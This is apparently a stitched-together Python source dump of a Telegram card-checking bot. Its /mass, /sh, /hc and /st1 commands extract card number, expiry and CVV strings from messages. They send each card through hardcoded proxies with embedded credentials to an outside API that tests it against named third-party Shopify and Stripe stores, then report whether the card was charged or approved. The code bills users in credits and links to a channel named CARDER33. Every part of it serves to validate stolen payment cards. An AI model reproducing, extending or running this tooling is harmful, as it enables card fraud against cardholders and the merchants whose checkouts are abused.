                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {mdv2_escape(str(counters['declined']))}\n"
                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {mdv2_escape(str(counters['error']))}\n"
                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {mdv2_escape(str(elapsed))} Sec\n"
                    "──────── ⸙ ─────────"
                )
                content = header + "\n" + "\n──────── ⸙ ─────────\n".join(results)

                try:
                    await msg_obj.edit_text(
                        content,
                        parse_mode="MarkdownV2",
                        disable_web_page_preview=True
                    )
                except (BadRequest, TelegramError) as e:
                    logging.error(f"[editMessageText-update] {e}")

                await asyncio.sleep(0.3)

        await asyncio.gather(*tasks, consumer())

import re
import asyncio
import time
import logging
from telegram import Update
from telegram.error import BadRequest
from telegram.ext import ContextTypes

# --- Configuration ---
RATE_LIMIT_SECONDS = 2  # adjust cooldown
CONCURRENCY = 3          # adjust concurrency
BULLET_GROUP_LINK = "https://t.me/yourgroup"  # replace with your link

user_last_command_time = {}  # cooldown tracker

# --- Helper Functions ---
def mdv2_escape(text: str) -> str:
    """Escape all MarkdownV2 special characters."""
    escape_chars = r"\_*[]()~`>#+-=|{}.!"
    return "".join(f"\\{c}" if c in escape_chars else c for c in text)

def extract_cards(text: str):
    """
    Extract only valid card strings: number|mm|yy(yy)|cvv
    Supports formats like:
    4111111111111111|12|25|123
    5500000000000004|01|2026|999
    """
    pattern = r"\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b"
    return [match.group(0) for match in re.finditer(pattern, text)]

# --- MASS HANDLER ---
async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    current_time = time.time()

    # --- Cooldown ---
    if user_id in user_last_command_time:
        elapsed = current_time - user_last_command_time[user_id]
        if elapsed < RATE_LIMIT_SECONDS:
            remaining = round(RATE_LIMIT_SECONDS - elapsed, 2)
            await update.message.reply_text(
                f"⚠️ Please wait <b>{remaining}</b>s before using /mass again.",
                parse_mode="HTML"
            )
            return

    # --- Credit check ---
    if not await deduct_credit(user_id):
        await update.message.reply_text("❌ You have no credits.", parse_mode="HTML")
        return

    user_last_command_time[user_id] = current_time

    # --- Extract cards from args or replied message ---
    text_source = ""
    if context.args:
        text_source = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        text_source = update.message.reply_to_message.text

    cards = extract_cards(text_source)

    if not cards:
        await update.message.reply_text("🚫 No valid cards found.", parse_mode="HTML")
        return

    if len(cards) > 30:
        await update.message.reply_text(
            "⚠️ Max 30 cards allowed. Only first 30 will be processed.",
            parse_mode="HTML"
        )
        cards = cards[:30]

    # --- Build initial "Processing" message (Gateway only) ---
    bullet = "[⌇]"
    bullet_link = f"[{mdv2_escape(bullet)}]({BULLET_GROUP_LINK})"
    gateway_text = mdv2_escape("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
    status_text = mdv2_escape("𝗦𝘁𝗮𝘁𝘂s ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")

    initial_text = (
        f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n"
        f"{bullet_link} {gateway_text}\n"
        f"{bullet_link} {status_text}"
    )

    try:
        initial_msg = await update.message.reply_text(
            initial_text,
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
    except BadRequest as e:
        logging.error(f"[mass_handler-init-msg] {e}")
        return

    # --- Start mass checker ---
    asyncio.create_task(run_mass_checker(initial_msg, cards, user))






import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

# Global Shopify site for /sh API requests
CURRENT_SHOPIFY_SITE = "https://happyhealthyyou.com"


logger = logging.getLogger(__name__)

import urllib.parse

AUTOSH_BASE = "https://rocks-mbs7.onrender.com/index.php"
DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"

async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_SHOPIFY_SITE

    # Get the site URL from command args
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /changeshsite https://newshopifysite.com")
        return

    new_site = context.args[0].strip()
    if not new_site.startswith("http"):
        await update.message.reply_text("❌ Invalid URL. Must start with http or https.")
        return

    # --- Test the site via API using a dummy card ---
    test_card = "4242424242424242|12|2025|123"
    encoded_site = urllib.parse.quote_plus(new_site)
    encoded_card = urllib.parse.quote_plus(test_card)
    encoded_proxy = urllib.parse.quote_plus(DEFAULT_PROXY)

    api_url = (
        f"{AUTOSH_BASE}"
        f"?site={encoded_site}"
        f"&cc={encoded_card}"
        f"&proxy={encoded_proxy}"
    )

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=30) as resp:
                api_response_text = await resp.text()
        
        try:
            api_response = json.loads(api_response_text)
        except json.JSONDecodeError:
            api_response = {"Response": api_response_text}

        # Update global site
        CURRENT_SHOPIFY_SITE = new_site

        # Reply to user
        await update.message.reply_text(
            f"✅ Shopify site added: <code>{CURRENT_SHOPIFY_SITE}</code>\n"
            f"📥 API Test Response: <code>{escape(json.dumps(api_response, indent=2)[:1000])}</code>",
            parse_mode=ParseMode.HTML
        )

    except Exception as e:
        await update.message.reply_text(
            f"❌ Failed to test site: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )


from telegram.constants import ParseMode
from telegram import Update
from telegram.ext import ContextTypes
import html

async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /sh command: check Shopify card, display response and BIN info.
    Gateway label = Shopify, Price = 0.98$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /sh 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟬.𝟵𝟴$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        encoded_site = urllib.parse.quote_plus(CURRENT_SHOPIFY_SITE)
        encoded_cc = urllib.parse.quote_plus(full_card)
        encoded_proxy = urllib.parse.quote_plus(DEFAULT_PROXY)
        api_url = f"{AUTOSH_BASE}?site={encoded_site}&cc={encoded_cc}&proxy={encoded_proxy}"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{html.escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{html.escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{html.escape(full_name)}</a>'

        # --- Developer Branding ---
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status ---
        header_status = "❌ Declined"
        if re.search(r"\b(Thank You|ORDER_PLACED|approved|success|charged)\b", response, re.I):
            header_status = "🔥 Charged"
        elif any(x in response.upper() for x in ["3D_AUTHENTICATION", "INVALID_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Enhance response with emojis ---
        display_response = html.escape(response)
        if re.search(r"\b(Thank You|approved|success|charged)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟬.𝟵𝟴$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /sh")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass





import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: allows |, /, :, or spaces as separators
SH_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = SH_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = SH_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/sh card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_sh(update, context, payload))




import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
import urllib.parse

AUTOSH_BASE = "https://rockyog.onrender.com/index.php"
HC_PROXY = "198.23.239.134:6540:fvbysspi:bsbh3trstb1c"

async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /hc command: check HC card, display response and BIN info.
    Gateway label = Shopify, Price = 10$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/hc 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟬$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        encoded_card = urllib.parse.quote_plus(full_card)
        encoded_proxy = urllib.parse.quote_plus(HC_PROXY)
        encoded_site = urllib.parse.quote_plus("https://shop.outsideonline.com")
        api_url = f"{AUTOSH_BASE}?site={encoded_site}&cc={encoded_card}&proxy={encoded_proxy}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{html.escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{html.escape(full_name)}</a>'

        # --- Developer Branding ---
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        header_status = "❌ Declined"
        display_response = html.escape(response)

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|success|charged)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif "INCORRECT_CVC" in response.upper():
            display_response += " ✅"
            header_status = "✅ Approved"
        elif "INCORRECT_ZIP" in response.upper():
            header_status = "✅ Approved"
        elif "INSUFFICIENT_FUNDS" in response.upper():
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟬$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /hc")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{html.escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass



import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
HC_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def hc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = HC_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = HC_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/hc card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                   # Pad month to 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Reduce YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_hc(update, context, payload))



import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
import urllib.parse

AUTOSH_BASE = "https://rockyog.onrender.com/index.php"
ST1_PROXY = "45.38.107.97:6014:fvbysspi:bsbh3trstb1c"
ST1_SITE = "https://vasileandpavel.com"

async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /st1 command: check Stripe charge, display response and BIN info.
    Gateway label = Stripe, Price = 3$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/st1 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟯$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        encoded_card = urllib.parse.quote_plus(full_card)
        encoded_site = urllib.parse.quote_plus(ST1_SITE)
        encoded_proxy = urllib.parse.quote_plus(ST1_PROXY)
        encoded_gateway = urllib.parse.quote_plus("stripe")

        api_url = (
            f"{AUTOSH_BASE}"
            f"?site={encoded_site}"
            f"&cc={encoded_card}"
            f"&gateway={encoded_gateway}"
            f"&proxy={encoded_proxy}"
        )

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝟯$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /st1")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass





import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
ST1_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = ST1_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = ST1_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/st1 card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Reduce YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_st1(update, context, payload))


import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False



# --- Shopify Processor ---
import asyncio
import aiohttp
import json
import logging
